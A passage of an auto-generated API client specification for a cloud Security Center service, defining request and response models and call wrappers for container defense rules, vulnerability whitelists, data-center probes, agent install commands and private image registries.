model AddCloudVendorTrialConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddCloudVendorTrialConfigResponseBody(name='body'),
}

/**
 * @summary Add Trail Configuration
 *
 * @param request AddCloudVendorTrialConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddCloudVendorTrialConfigResponse
 */
async function addCloudVendorTrialConfigWithOptions(request: AddCloudVendorTrialConfigRequest, runtime: Util.RuntimeOptions): AddCloudVendorTrialConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.authId)) {
    query['AuthId'] = request.authId;
  }
  if (!Util.isUnset(request.authInfo)) {
    query['AuthInfo'] = request.authInfo;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddCloudVendorTrialConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Add Trail Configuration
 *
 * @param request AddCloudVendorTrialConfigRequest
 * @return AddCloudVendorTrialConfigResponse
 */
async function addCloudVendorTrialConfig(request: AddCloudVendorTrialConfigRequest): AddCloudVendorTrialConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return addCloudVendorTrialConfigWithOptions(request, runtime);
}

model AddContainerDefenseRuleRequest {
  description?: string(name='Description', description='The description of the rule.', example='test-proc-defense'),
  ruleAction?: int32(name='RuleAction', description='The action that is performed when the rule is hit. Valid values:

*   **1**: alert
*   **2**: block', example='1'),
  ruleId?: long(name='RuleId', description='The ID of the rule. You do not need to manually specify the ID.', example='500018'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='auto-test-rule-lt9umq'),
  ruleSwitch?: int32(name='RuleSwitch', description='The switch of the rule. Valid values:

*   **0**: off
*   **1**: on', example='1'),
  ruleType?: int32(name='RuleType', description='The rule type. Valid values:

*   2: user-defined rules

> Only the value 2 is supported.', example='2'),
  scope?: [ 
    {
      allNamespace?: int32(name='AllNamespace', description='Specifies whether to include all namespaces. Valid values:

*   **0**: You can use the Namespaces parameter to specify the namespaces to include.
*   **1**: All namespaces are included.', example='0'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.

>  You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/182997.html) operation to query the IDs of clusters.', example='8e2***75b'),
      namespaces?: [ string ](name='Namespaces', description='The namespaces to include.'),
    }
  ](name='Scope', description='The scope.'),
  whitelist?: {
    hash?: [ string ](name='Hash', description='The hash values of the files that need to be added to the whitelist.

> This parameter is not supported.', deprecated=true),
    image?: [ string ](name='Image', description='The images that need to be added to the whitelist.'),
    path?: [ string ](name='Path', description='The paths to the files that need to be added to the whitelist.'),
  }(name='Whitelist', description='The whitelist.'),
}

model AddContainerDefenseRuleShrinkRequest {
  description?: string(name='Description', description='The description of the rule.', example='test-proc-defense'),
  ruleAction?: int32(name='RuleAction', description='The action that is performed when the rule is hit. Valid values:

*   **1**: alert
*   **2**: block', example='1'),
  ruleId?: long(name='RuleId', description='The ID of the rule. You do not need to manually specify the ID.', example='500018'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='auto-test-rule-lt9umq'),
  ruleSwitch?: int32(name='RuleSwitch', description='The switch of the rule. Valid values:

*   **0**: off
*   **1**: on', example='1'),
  ruleType?: int32(name='RuleType', description='The rule type. Valid values:

*   2: user-defined rules

> Only the value 2 is supported.', example='2'),
  scope?: [ 
    {
      allNamespace?: int32(name='AllNamespace', description='Specifies whether to include all namespaces. Valid values:

*   **0**: You can use the Namespaces parameter to specify the namespaces to include.
*   **1**: All namespaces are included.', example='0'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.

>  You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/182997.html) operation to query the IDs of clusters.', example='8e2***75b'),
      namespaces?: [ string ](name='Namespaces', description='The namespaces to include.'),
    }
  ](name='Scope', description='The scope.'),
  whitelistShrink?: string(name='Whitelist', description='The whitelist.'),
}

model AddContainerDefenseRuleResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: long(name='Data', description='The ID of the rule that is created.', example='182'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='There was an error with your request.'),
  requestId?: string(name='RequestId', description='The request ID.', example='8C376***AE74FB4'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model AddContainerDefenseRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddContainerDefenseRuleResponseBody(name='body'),
}

/**
 * @summary Creates a rule for non-image program defense.
 *
 * @param tmpReq AddContainerDefenseRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddContainerDefenseRuleResponse
 */
async function addContainerDefenseRuleWithOptions(tmpReq: AddContainerDefenseRuleRequest, runtime: Util.RuntimeOptions): AddContainerDefenseRuleResponse {
  Util.validateModel(tmpReq);
  var request = new AddContainerDefenseRuleShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.whitelist)) {
    request.whitelistShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.whitelist, 'Whitelist', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.description)) {
    query['Description'] = request.description;
  }
  if (!Util.isUnset(request.ruleAction)) {
    query['RuleAction'] = request.ruleAction;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  if (!Util.isUnset(request.scope)) {
    query['Scope'] = request.scope;
  }
  if (!Util.isUnset(request.whitelistShrink)) {
    query['Whitelist'] = request.whitelistShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddContainerDefenseRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a rule for non-image program defense.
 *
 * @param request AddContainerDefenseRuleRequest
 * @return AddContainerDefenseRuleResponse
 */
async function addContainerDefenseRule(request: AddContainerDefenseRuleRequest): AddContainerDefenseRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return addContainerDefenseRuleWithOptions(request, runtime);
}

model AddContainerPluginRuleRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  mode?: int32(name='Mode', description='The action that you want to specify for the rule. Valid values:

*   **1**: triggers alerts.
*   **2**: blocks escapes.

This parameter is required.', example='1'),
  ruleName?: string(name='RuleName', description='The name of the rule. The name must be 1 to 80 characters in length, and can contain letters, digits, hyphens (-), forward slashes (/), periods (.), and underscores (_). The names of rules that are created for the same user must be unique.

This parameter is required.', example='tyest111'),
  ruleTemplateId?: int32(name='RuleTemplateId', description='The ID of the rule template. You can call the ListSystemClientRules operation to query the ID of the rule template.

This parameter is required.', example='86863'),
  ruleType?: int32(name='RuleType', description='The type of the rule. Valid values:

*   **0**: custom rule
*   **1**: system rule', example='0'),
  selectedPolicy?: [ string ](name='SelectedPolicy', description='The check items that are enabled for the rule.

This parameter is required.'),
  whiteImages?: [ string ](name='WhiteImages', description='The images that are added to the whitelist.'),
}

model AddContainerPluginRuleResponseBody = {
  data?: {
    ruleId?: long(name='RuleId', description='The ID of the rule.', example='219'),
    ruleName?: string(name='RuleName', description='The name of the rule.', example='test2'),
    switchId?: string(name='SwitchId', description='The ID of the switch.', example='USER-CONTAINER-RULE-SWITCH-TYPE_xxxx'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model AddContainerPluginRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddContainerPluginRuleResponseBody(name='body'),
}

/**
 * @summary Creates a defense rule against container escapes.
 *
 * @param request AddContainerPluginRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddContainerPluginRuleResponse
 */
async function addContainerPluginRuleWithOptions(request: AddContainerPluginRuleRequest, runtime: Util.RuntimeOptions): AddContainerPluginRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleTemplateId)) {
    query['RuleTemplateId'] = request.ruleTemplateId;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  if (!Util.isUnset(request.selectedPolicy)) {
    query['SelectedPolicy'] = request.selectedPolicy;
  }
  if (!Util.isUnset(request.whiteImages)) {
    query['WhiteImages'] = request.whiteImages;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddContainerPluginRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a defense rule against container escapes.
 *
 * @param request AddContainerPluginRuleRequest
 * @return AddContainerPluginRuleResponse
 */
async function addContainerPluginRule(request: AddContainerPluginRuleRequest): AddContainerPluginRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return addContainerPluginRuleWithOptions(request, runtime);
}

model AddIdcProbeRequest {
  idcName?: string(name='IdcName', description='The name of the data center.

This parameter is required.', example='test'),
  idcRegion?: string(name='IdcRegion', description='The region ID.

This parameter is required.', example='Hangzhou'),
  intervalPeriod?: int32(name='IntervalPeriod', description='The scan interval.

This parameter is required.', example='1'),
  ipSegments?: string(name='IpSegments', description='The settings of the CIDR block.

This parameter is required.', example='192.168.XX.XX/24'),
  linuxPort?: string(name='LinuxPort', description='The Linux port.

This parameter is required.', example='40'),
  periodUnit?: string(name='PeriodUnit', description='The unit of the scan interval. Valid values:

*   **day**
*   **hour**

This parameter is required.', example='day'),
  uuids?: string(name='Uuids', description='The UUID of the server. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUID.

This parameter is required.', example='076a446d-df7d-424c-bdc5-bb5dc7f1****'),
  winPort?: string(name='WinPort', description='The Windows port.

This parameter is required.', example='40'),
}

model AddIdcProbeResponseBody = {
  addIdcProbeFailedList?: [ 
    {
      errorMsg?: string(name='ErrorMsg', description='The error message that is returned.', example='The ResourceDirectoryId is invalid.'),
      idcName?: string(name='IdcName', description='The name of the data center.', example='test'),
      idcRegion?: string(name='IdcRegion', description='The region ID.', example='Hangzhou'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='sas-yqcl2ck3****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='gl-sms-01'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='95.214.XXX.XXX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address.', example='172.29.XXX.XXX'),
      ipSegments?: string(name='IpSegments', description='The settings of the CIDR block.', example='192.168.XX.XX/24'),
      uuid?: string(name='Uuid', description='The UUID of the server. Multiple UUIDs are separated by commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUID.', example='076a446d-df7d-424c-bdc5-bb5dc7f1****'),
    }
  ](name='AddIdcProbeFailedList', description='The records of failure.'),
  count?: string(name='Count', description='The total number of entries returned.', example='1'),
  requestId?: string(name='RequestId', description='The request ID.', example='D706F2DD-FF07-576B-9DD1-0B484A9B3065'),
}

model AddIdcProbeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddIdcProbeResponseBody(name='body'),
}

/**
 * @summary Creates an IDC probe to add assets in a data center to Security Center and manage the assets by using the Security Center console.
 *
 * @description Security Center allows you to create an IDC probe only on servers on which the Security Center agent is installed.
 *
 * @param request AddIdcProbeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddIdcProbeResponse
 */
async function addIdcProbeWithOptions(request: AddIdcProbeRequest, runtime: Util.RuntimeOptions): AddIdcProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.idcName)) {
    query['IdcName'] = request.idcName;
  }
  if (!Util.isUnset(request.idcRegion)) {
    query['IdcRegion'] = request.idcRegion;
  }
  if (!Util.isUnset(request.intervalPeriod)) {
    query['IntervalPeriod'] = request.intervalPeriod;
  }
  if (!Util.isUnset(request.ipSegments)) {
    query['IpSegments'] = request.ipSegments;
  }
  if (!Util.isUnset(request.linuxPort)) {
    query['LinuxPort'] = request.linuxPort;
  }
  if (!Util.isUnset(request.periodUnit)) {
    query['PeriodUnit'] = request.periodUnit;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.winPort)) {
    query['WinPort'] = request.winPort;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddIdcProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates an IDC probe to add assets in a data center to Security Center and manage the assets by using the Security Center console.
 *
 * @description Security Center allows you to create an IDC probe only on servers on which the Security Center agent is installed.
 *
 * @param request AddIdcProbeRequest
 * @return AddIdcProbeResponse
 */
async function addIdcProbe(request: AddIdcProbeRequest): AddIdcProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return addIdcProbeWithOptions(request, runtime);
}

model AddImageEventOperationRequest {
  conditions?: string(name='Conditions', description='The rule conditions. The value is in the JSON format. Valid values of keys:

*   **condition**: the matching condition.
*   **type**: the matching type.
*   **value**: the matching value.', example='[{\\\\"condition\\\\": \\\\"MD5\\\\", \\\\"type\\\\": \\\\"equals\\\\", \\\\"value\\\\": \\\\"0083a31cc0083a31ccf7c10367a6e783e\\\\"}]'),
  eventKey?: string(name='EventKey', description='The keyword of the alert item.', example='PEM'),
  eventName?: string(name='EventName', description='The name of the alert item.', example='PEM'),
  eventType?: string(name='EventType', description='The alert type.

*   Set the value to **sensitiveFile**.', example='sensitiveFile'),
  note?: string(name='Note', description='The remarks that you want to add.', example='test'),
  operationCode?: string(name='OperationCode', description='The operation code.

*   Set the value to **whitelist** to add the alert item to the whitelist.', example='whitelist'),
  scenarios?: string(name='Scenarios', description='The application scope of the rule. The value is in the JSON format. Valid values of keys:

*   **type**
*   **value**', example='{\\\\"type\\\\": \\\\"repo\\\\", \\\\"value\\\\": \\\\"test-aaa/shenzhen-repo-01\\\\"}'),
  source?: string(name='Source', description='The source of the whitelist. Valid values:

*   **image**: image.
*   **agentless**: agentless detection.', example='agentless'),
}

model AddImageEventOperationResponseBody = {
  code?: string(name='Code', description='The HTTP status code.', example='200'),
  data?: {
    conditions?: string(name='Conditions', description='The rule conditions. The value is in the JSON format. Valid values of keys:

*   **condition**: the matching condition.
*   **type**: the matching type.
*   **value**: the matching value.', example='[{\\\\"condition\\\\": \\\\"MD5\\\\", \\\\"type\\\\": \\\\"equals\\\\", \\\\"value\\\\": \\\\"0083a31cc0083a31ccf7c10367a6e783e\\\\"}]'),
    eventKey?: string(name='EventKey', description='The keyword of the alert item.', example='PEM'),
    eventName?: string(name='EventName', description='The name of the alert item.', example='PEM'),
    eventType?: string(name='EventType', description='The alert type.

*   Only **sensitiveFile** may be returned.', example='sensitiveFile'),
    id?: long(name='Id', description='The primary key of the alert handling rule.', example='443496'),
    operationCode?: string(name='OperationCode', description='The operation code.

*   Only **whitelist** may be returned, which indicates that the alert item is added to the whitelist.', example='whitelist'),
    scenarios?: string(name='Scenarios', description='The application scope of the rule. The value is in the JSON format. Valid values of keys:

*   **type**
*   **value**', example='{\\\\"type\\\\": \\\\"repo\\\\", \\\\"value\\\\": \\\\"test-aaa/shenzhen-repo-01\\\\"}'),
  }(name='Data', description='The returned data.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='0C8487EF-50C2-54BB-8634-10F8C35D****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model AddImageEventOperationResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddImageEventOperationResponseBody(name='body'),
}

/**
 * @summary Creates an alert handling rule.
 *
 * @param request AddImageEventOperationRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddImageEventOperationResponse
 */
async function addImageEventOperationWithOptions(request: AddImageEventOperationRequest, runtime: Util.RuntimeOptions): AddImageEventOperationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.conditions)) {
    query['Conditions'] = request.conditions;
  }
  if (!Util.isUnset(request.eventKey)) {
    query['EventKey'] = request.eventKey;
  }
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.eventType)) {
    query['EventType'] = request.eventType;
  }
  if (!Util.isUnset(request.note)) {
    query['Note'] = request.note;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.scenarios)) {
    query['Scenarios'] = request.scenarios;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddImageEventOperation',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates an alert handling rule.
 *
 * @param request AddImageEventOperationRequest
 * @return AddImageEventOperationResponse
 */
async function addImageEventOperation(request: AddImageEventOperationRequest): AddImageEventOperationResponse {
  var runtime = new Util.RuntimeOptions{};
  return addImageEventOperationWithOptions(request, runtime);
}

model AddImageVulWhiteListRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: zh. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  reason?: string(name='Reason', description='The reason why you add the vulnerability to the whitelist.', example='already config in another way'),
  source?: string(name='Source', description='The source of the whitelist. Valid values:
- **image**
- **agentless**', example='image'),
  target?: string(name='Target', description='The object on which you want to perform the operation. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: the object type. The value is fixed to repo.
*   **target**: the object content. The value is in the Namespace/Image repository format.', example='{\\\\"type\\\\":\\\\"repo\\\\",\\\\"target\\\\":[\\\\"sas_test/script_0209\\\\",\\\\"sas_test/script\\\\"]}'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: system vulnerability
*   **sca**: application vulnerability', example='cve'),
  whitelist?: string(name='Whitelist', description='The whitelist. The value of this parameter is in the JSON format and contains the following fields:

*   **Type**: the vulnerability type. Valid values: cve and sca.
*   **Name**: the name of the vulnerability that is specified in Common Vulnerabilities and Exposures (CVE).
*   **AliasName**: the alias of the vulnerability that is specified in CVE.', example='[{\\\\"Type\\\\":\\\\"sca\\\\",\\\\"Name\\\\":\\\\"imgsca:java:spring-core:AVD-2022-1124599\\\\",\\\\"AliasName\\\\":\\\\"Spring Framework JDK >= 9 (CVE-2022-22965)\\\\"}]'),
}

model AddImageVulWhiteListResponseBody = {
  code?: string(name='Code', description='The status code returned. A value of **200** indicates that the request was successful. Other values indicate that the request failed. You can identify the cause of the failure based on the value of this parameter.', example='200'),
  data?: boolean(name='Data', description='Indicates whether the image vulnerability is added to the whitelist. Valid values:

*   **true**: The image vulnerability is added to the whitelist.
*   **false**: The image vulnerability is not added to the whitelist.', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model AddImageVulWhiteListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddImageVulWhiteListResponseBody(name='body'),
}

/**
 * @summary Adds image vulnerabilities to the whitelist.
 *
 * @param request AddImageVulWhiteListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddImageVulWhiteListResponse
 */
async function addImageVulWhiteListWithOptions(request: AddImageVulWhiteListRequest, runtime: Util.RuntimeOptions): AddImageVulWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.whitelist)) {
    query['Whitelist'] = request.whitelist;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddImageVulWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds image vulnerabilities to the whitelist.
 *
 * @param request AddImageVulWhiteListRequest
 * @return AddImageVulWhiteListResponse
 */
async function addImageVulWhiteList(request: AddImageVulWhiteListRequest): AddImageVulWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return addImageVulWhiteListWithOptions(request, runtime);
}

model AddInstallCodeRequest {
  expiredDate?: long(name='ExpiredDate', description='The validity period of the installation command. The value is a 13-digit timestamp.

>  The installation command is valid only within the validity period. An expired installation command cannot be used to install the Security Center agent.', example='1680257463853'),
  groupId?: long(name='GroupId', description='The ID of the asset group to which you want to add the asset.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='8076980'),
  onlyImage?: boolean(name='OnlyImage', description='Specifies whether to create an image. Default value: **false**. Valid values:

*   **false**: does not create an image.
*   **true**: creates an image.', example='false'),
  os?: string(name='Os', description='The operating system of the asset. Default value: **linux**. Valid values:

*   **linux**
*   **windows**', example='linux'),
  privateLinkId?: long(name='PrivateLinkId', description='The ID of the PrivateLink endpoint.', example='72845'),
  proxyCluster?: string(name='ProxyCluster', description='The name of the proxy cluster.', example='proxy_test'),
  vendorName?: string(name='VendorName', description='The name of the service provider for the asset. Default value: **ALIYUN**.

>  You can call the [DescribeVendorList](~~DescribeVendorList~~) operation to query the names of service providers.', example='ALIYUN'),
}

model AddInstallCodeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model AddInstallCodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: AddInstallCodeResponseBody(name='body'),
}

/**
 * @summary Creates a command that is used to install the Security Center agent.
 *
 * @param request AddInstallCodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return AddInstallCodeResponse
 */
async function addInstallCodeWithOptions(request: AddInstallCodeRequest, runtime: Util.RuntimeOptions): AddInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.expiredDate)) {
    query['ExpiredDate'] = request.expiredDate;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.onlyImage)) {
    query['OnlyImage'] = request.onlyImage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.privateLinkId)) {
    query['PrivateLinkId'] = request.privateLinkId;
  }
  if (!Util.isUnset(request.proxyCluster)) {
    query['ProxyCluster'] = request.proxyCluster;
  }
  if (!Util.isUnset(request.vendorName)) {
    query['VendorName'] = request.vendorName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a command that is used to install the Security Center agent.
 *
 * @param request AddInstallCodeRequest
 * @return AddInstallCodeResponse
 */
async function addInstallCode(request: AddInstallCodeRequest): AddInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return addInstallCodeWithOptions(request, runtime);
}

model AddPrivateRegistryRequest {
  domainName?: string(name='DomainName', description='The domain name of the image repository.

This parameter is required.', example='example.com'),
  extraParam?: string(name='ExtraParam', description='The additional parameter of the image repository. This parameter is required when you set the RegistryType parameter to **quay**. Valid values:

*   **namespace**
*   **authToken**', example='[{"namespace":"aa","authToken":"aa"}]'),
  netType?: long(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: virtual private cloud (VPC)

This parameter is required.', example='2'),
  password?: string(name='Password', description='The password that is used to log on to the image repository.

This parameter is required.', example='******'),
  port?: int32(name='Port', description='The port number.', example='80'),
  protocolType?: long(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS

This parameter is required.', example='2'),
  registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.

This parameter is required.', example='``114.55.**.**``'),
  registryRegionId?: string(name='RegistryRegionId', description='The region ID.

>  You can call the [ListImageRegistryRegion](~~ListImageRegistryRegion~~) operation to query the IDs of supported regions.

This parameter is required.', example='cn-hangzhou'),
  registryType?: string(name='RegistryType', description='The type of the private image repository. Valid values:

*   **harbor**
*   **quay**

This parameter is required.', example='harbor'),
  registryVersion?: string(name='RegistryVersion', description='The version of the image repository. Valid values:

*   **V1**
*   **V2**

This parameter is required.', example='V2'),
  transPerHour?: int32(name='TransPerHour', description='The number of images that are scanned per hour.', example='10'),
  userName?: string(name='UserName', description='The username that is used to log on to the image repository.

This parameter is required.', example='xxxxx'),
  vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-wz9hs3e5*******908kd'),
}

model AddPrivateRegistryResponseBody = {
  data?: {
    aliUid?: long(name='AliUid', description='The ID of the user.', example='1766185894104***'),
    domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
    id?: long(name='Id', description='The ID of the image repository.', example='273698***'),
    netType?: long(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: VPC', example='2'),
    password?: string(name='Password', description='The password.', example='***********'),
    protocolType?: long(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='2'),
    regionId?: string(name='RegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
    registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='``114.55.**.**``'),
    registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **harbor**
*   **quay**', example='harbor'),
    registryVersion?: string(name='RegistryVersion', description='The version of the image repository. Default value: -. Valid values:

*   **-**: the default version
*   **V1**
*   **V2**', example='V2'),
    token?: string(name='Token', description='The value of the token.', example='3c3c602c-fa1f-4bc0-992f-b4b2cac7****'),
    transPerHour?: int32(name='TransPerHour', description='The number of scan tasks that are performed per hour.', example='10'),
    userName?: string(name='UserName', description='The username.', example='******'),
    vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-2vchkxmf2j9yjt3x2****'),
  }(name='Data', description='The handling result.'),
